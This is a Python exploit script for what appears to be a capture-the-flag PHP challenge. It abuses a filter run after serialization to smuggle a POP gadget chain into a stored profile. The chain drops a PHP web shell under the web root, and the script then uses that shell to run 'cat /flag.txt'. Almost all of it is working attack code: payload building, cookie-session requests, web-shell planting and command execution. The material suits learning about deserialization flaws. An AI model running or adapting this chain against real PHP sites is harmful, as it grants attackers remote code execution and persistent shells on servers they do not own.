#!/usr/bin/env python3
"""
05 - serialize-then-replace : automated exploit.

The app serializes a Profile object, then runs `str_replace('../', '', $blob)`
over the *already serialized* blob before storing it.  Every '../' we hide in
the `nickname` field removes 3 bytes from the stored string while the `s:<len>:`
prefix that PHP wrote keeps the pre-filter value.  On the next page view the
parser therefore reads `len` bytes for `nickname`, runs past the real end of the
value and eats the serialized framing that follows it, until it lands exactly on
the first byte of the `bio` value -- which is ours.

Python 3 stdlib only.
"""

import base64
import http.cookiejar
import re
import secrets
import sys
import urllib.parse
import urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://challenge"
BASE = BASE.rstrip("/")

# ---------------------------------------------------------------- PHP serialize

def s(v: str) -> str:
    """PHP-serialize a string, including the trailing ';'."""
    return 's:%d:"%s";' % (len(v.encode()), v)


def key(v: str) -> str:
    """A property / array key: same encoding as a string value."""
    return s(v)


def obj(cls: str, props) -> str:
    """PHP-serialize an object.  Note: objects are NOT ';'-terminated."""
    body = "".join(key(k) + v for k, v in props)
    return 'O:%d:"%s":%d:{%s}' % (len(cls), cls, len(props), body)


# ---------------------------------------------------------------- HTTP plumbing

JAR = http.cookiejar.CookieJar()
OPENER = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(JAR))


def get(path: str) -> str:
    with OPENER.open(BASE + path, timeout=15) as r:
        return r.read().decode("utf-8", "replace")


def post(path: str, data: dict) -> str:
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(BASE + path, data=body)
    with OPENER.open(req, timeout=15) as r:
        return r.read().decode("utf-8", "replace")


# ---------------------------------------------------------------- payload

FILTER_FROM, FILTER_TO = "../", ""
SHRINK = len(FILTER_FROM) - len(FILTER_TO)          # 3 bytes gone per occurrence

# stage 2 of the POP chain: RemoteImage::__toString() -> file_get_contents()
SHELL = '<?php system($_GET["c"]); ?>'
SRC = "data://text/plain;base64," + base64.b64encode(SHELL.encode()).decode()

# stage 1: ThumbnailCache::__destruct() -> file_put_contents($path, (string)$data)
DROP_NAME = "c%s.php" % secrets.token_hex(4)
DROP_PATH = "/var/www/html/thumbs/" + DROP_NAME

GADGET = obj("ThumbnailCache", [
    ("path", s(DROP_PATH)),
    ("data", obj("RemoteImage", [("src", s(SRC))])),
])

# What the parser must find once `nickname` has finished eating the framing:
#   '";'            -> closes the (over-long) nickname string
#   s:6:"avatar";.. -> property #2 of Profile: our gadget object
#   s:3:"bio";s:5:" -> property #3, an *open* string.  The 3 bytes the original
#                      blob still has after our value ('";}') close it and then
#                      close the object.
PAYLOAD = '";' + key("avatar") + GADGET + 's:3:"bio";s:5:"pwned'
LB = len(PAYLOAD)

assert FILTER_FROM not in PAYLOAD, "payload must survive the filter untouched"


def middle(username: str) -> str:
    """
    The serialized bytes between the end of the real `nickname` value and the
    first byte of the `bio` value, i.e. exactly what the over-long length
    prefix has to swallow:

        ";s:8:"username";s:<lu>:"<user>";s:3:"bio";s:<lb>:"
    """
    return '";' + key("username") + s(username) + 's:3:"bio";s:%d:"' % LB


def pick_username() -> str:
    """
    The gap has to be an exact multiple of the 3 bytes the filter removes.
    Its size depends on the username length (and on the number of digits in the
    two length prefixes), so simply grow the username until it lines up.
    """
    for n in range(4, 33):
        u = "o" + secrets.token_hex(16)[: n - 1]
        if len(middle(u)) % SHRINK == 0:
            return u
    raise SystemExit("no username length lines up (should never happen)")


def main() -> int:
    user = pick_username()
    gap = len(middle(user))
    reps = gap // SHRINK
    nickname = "anon" + FILTER_FROM * reps

    print("[*] target            : %s" % BASE)
    print("[*] gadget            : ThumbnailCache::__destruct -> RemoteImage::__toString")
    print("[*] drop              : %s" % DROP_PATH)
    print("[*] bio payload       : %d bytes (this is the s:%d: prefix PHP will write)" % (LB, LB))
    print("[*] username          : %s (%d chars)" % (user, len(user)))
    print("[*] gap to swallow    : %d bytes -> %r" % (gap, middle(user)))
    print("[*] filter eats       : %d bytes per %r" % (SHRINK, FILTER_FROM))
    print("[*] '../' repetitions : %d  (%d * %d == %d)" % (reps, reps, SHRINK, gap))
    print("[*] nickname          : %d bytes declared, %d bytes after the filter"
          % (len(nickname), len(nickname) - reps * SHRINK))

    print("[*] registering ...")
    post("/register.php", {"username": user, "password": secrets.token_hex(8)})
    if not any(c.name == "vault_sid" for c in JAR):
        print("[-] registration failed (no session cookie)")
        return 1

    print("[*] saving the poisoned profile ...")
    post("/profile.php", {"nickname": nickname, "bio": PAYLOAD})

    print("[*] reading the profile back (this is where unserialize() runs) ...")
    html = get("/profile.php")
    if "s:8:&quot;username&quot;" not in html and "s:8:\"username\"" not in html:
        print("[!] the nickname does not look corrupted; the chain may still have fired")

    print("[*] triggering the dropped shell ...")
    out = get("/thumbs/%s?c=%s" % (DROP_NAME, urllib.parse.quote("cat /flag.txt")))

    m = re.search(r"PHRACK\{[^}]+\}", out)
    if not m:
        print("[-] no flag in the response:\n%s" % out[:500])
        return 1
    print("FLAG: %s" % m.group(0))
    return 0


if __name__ == "__main__":
    sys.exit(main())
